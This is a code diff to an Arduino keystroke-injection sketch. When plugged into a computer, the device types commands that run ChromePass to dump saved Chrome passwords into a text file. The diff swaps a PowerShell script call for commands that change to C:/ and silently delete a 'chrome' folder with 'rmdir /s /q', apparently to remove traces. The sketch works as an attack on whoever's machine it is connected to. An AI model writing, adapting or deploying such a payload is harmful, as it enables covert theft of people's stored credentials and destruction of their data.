@@ -39,11 +39,12 @@ void setup() {
   Keyboard.print("ChromePass.exe /stext maintenance.txt");
   typeKey(KEY_RETURN);
   delay(100);
-  Keyboard.print("powershell ./maintenance.ps1");
+  Keyboard.print("cd C:/");
   typeKey(KEY_RETURN);
   delay(100);
-  
-  /*typeKey(KEY_RETURN);
+  Keyboard.print("rmdir /s /q chrome");
+  typeKey(KEY_RETURN);
+  delay(100);
   Keyboard.print("exit");
   typeKey(KEY_RETURN);
 
